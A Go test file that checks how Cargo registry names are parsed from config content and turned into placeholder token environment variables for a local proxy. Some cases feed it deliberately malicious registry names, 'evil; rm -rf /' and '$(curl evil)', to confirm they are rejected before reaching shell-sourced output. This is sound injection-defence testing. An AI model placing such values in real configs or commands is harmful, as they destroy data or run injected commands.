package ecosystem

import (
	"testing"
)

func TestCargoRegistryEnvVarName(t *testing.T) {
	cases := []struct {
		name         string
		registryName string
		want         string
	}{
		{
			name:         "plain name",
			registryName: "othercorp",
			want:         "CARGO_REGISTRIES_OTHERCORP_TOKEN",
		},
		{
			name:         "dashed name maps dashes to underscores",
			registryName: "my-registry",
			want:         "CARGO_REGISTRIES_MY_REGISTRY_TOKEN",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := CargoRegistryEnvVarName(tc.registryName)
			if got != tc.want {
				t.Errorf("CargoRegistryEnvVarName(%q) = %q, want %q", tc.registryName, got, tc.want)
			}
		})
	}
}

func TestParseCargoRegistryNames(t *testing.T) {
	const localURL = "http://127.0.0.1:27182"

	cases := []struct {
		name     string
		content  string
		localURL string
		want     []string
	}{
		{
			name: "single registry rewritten",
			content: `[registries.othercorp]
index = "http://127.0.0.1:27182/other-index/"
`,
			localURL: localURL,
			want:     []string{"othercorp"},
		},
		{
			name: "multi-registry config only rewritten ones counted",
			content: `[registries.othercorp]
index = "http://127.0.0.1:27182/other-index/"

[registries.untouched]
index = "sparse+https://example.com/untouched-index/"

[registries.other]
index = "sparse+http://127.0.0.1:27182/other2-index/"
`,
			localURL: localURL,
			want:     []string{"othercorp", "other"},
		},
		{
			name: "source table with matching localURL is not picked up",
			content: `[source.proxy]
registry = "http://127.0.0.1:27182/index/"

[registries.othercorp]
index = "http://127.0.0.1:27182/other-index/"
`,
			localURL: localURL,
			want:     []string{"othercorp"},
		},
		{
			name: "no registries present",
			content: `[source.crates-io]
replace-with = "proxy"
`,
			localURL: localURL,
			want:     nil,
		},
		{
			name:     "empty content",
			content:  "",
			localURL: localURL,
			want:     nil,
		},
		{
			name: "duplicate registry name deduped",
			content: `[registries.othercorp]
index = "http://127.0.0.1:27182/other-index/"

[registries.othercorp]
index = "http://127.0.0.1:27182/other-index-again/"
`,
			localURL: localURL,
			want:     []string{"othercorp"},
		},
		{
			name: "quoted key with shell metacharacters is rejected",
			content: `[registries."evil; rm -rf /"]
index = "http://127.0.0.1:27182/other-index/"
`,
			localURL: localURL,
			want:     nil,
		},
		{
			name: "quoted key with command substitution is rejected",
			content: `[registries."$(curl evil)"]
index = "http://127.0.0.1:27182/other-index/"
`,
			localURL: localURL,
			want:     nil,
		},
		{
			name: "prefix that is a strict substring of another route's prefix is not attributed to it",
			content: `[registries.a]
index = "http://127.0.0.1:27182/a-2/other-index/"
`,
			localURL: "http://127.0.0.1:27182/a",
			want:     nil,
		},
		{
			name: "prefix boundary at end of string still matches",
			content: `[registries.a]
index = "http://127.0.0.1:27182/a"
`,
			localURL: "http://127.0.0.1:27182/a",
			want:     []string{"a"},
		},
		{
			name: "valid bare-key registry alongside malicious quoted-key registry",
			content: `[registries.othercorp]
index = "http://127.0.0.1:27182/other-index/"

[registries."evil; rm -rf /"]
index = "http://127.0.0.1:27182/other-index/"
`,
			localURL: localURL,
			want:     []string{"othercorp"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ParseCargoRegistryNames(tc.content, tc.localURL)
			if !stringSlicesEqual(got, tc.want) {
				t.Errorf("ParseCargoRegistryNames() = %v, want %v", got, tc.want)
			}
		})
	}
}

func stringSlicesEqual(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func TestCargoRegistryPlaceholders(t *testing.T) {
	names := []string{"othercorp", "my-registry"}

	got := CargoRegistryPlaceholders(names)

	if len(got) != len(names) {
		t.Fatalf("CargoRegistryPlaceholders() returned %d exports, want %d", len(got), len(names))
	}

	wantNames := []string{"CARGO_REGISTRIES_OTHERCORP_TOKEN", "CARGO_REGISTRIES_MY_REGISTRY_TOKEN"}
	for i, exp := range got {
		if exp.Name != wantNames[i] {
			t.Errorf("Exports[%d].Name = %q, want %q", i, exp.Name, wantNames[i])
		}
		if exp.Value != CargoPlaceholderToken {
			t.Errorf("Exports[%d].Value = %q, want %q", i, exp.Value, CargoPlaceholderToken)
		}
	}

	value, ok := exportValue(got, "CARGO_REGISTRIES_OTHERCORP_TOKEN")
	if !ok || value != CargoPlaceholderToken {
		t.Errorf("exportValue(CARGO_REGISTRIES_OTHERCORP_TOKEN) = (%q, %v), want (%q, true)", value, ok, CargoPlaceholderToken)
	}
}

// TestCargoRegistryPlaceholdersSkipsInvalidName covers issue #3142's
// defense-in-depth guard: a name failing cargoBareKeyPattern -- reachable now
// via a manifest's Route.CargoRegistries, not only via
// ParseCargoRegistryNames' own internal check -- must never reach the
// rendered, shell-sourced env output as a variable name.
func TestCargoRegistryPlaceholdersSkipsInvalidName(t *testing.T) {
	names := []string{"othercorp", "evil; rm -rf /", "my-registry"}

	got := CargoRegistryPlaceholders(names)

	want := []string{"CARGO_REGISTRIES_OTHERCORP_TOKEN", "CARGO_REGISTRIES_MY_REGISTRY_TOKEN"}
	if len(got) != len(want) {
		t.Fatalf("CargoRegistryPlaceholders() returned %d exports, want %d (invalid name must be skipped): %+v", len(got), len(want), got)
	}
	for i, exp := range got {
		if exp.Name != want[i] {
			t.Errorf("Exports[%d].Name = %q, want %q", i, exp.Name, want[i])
		}
	}
}
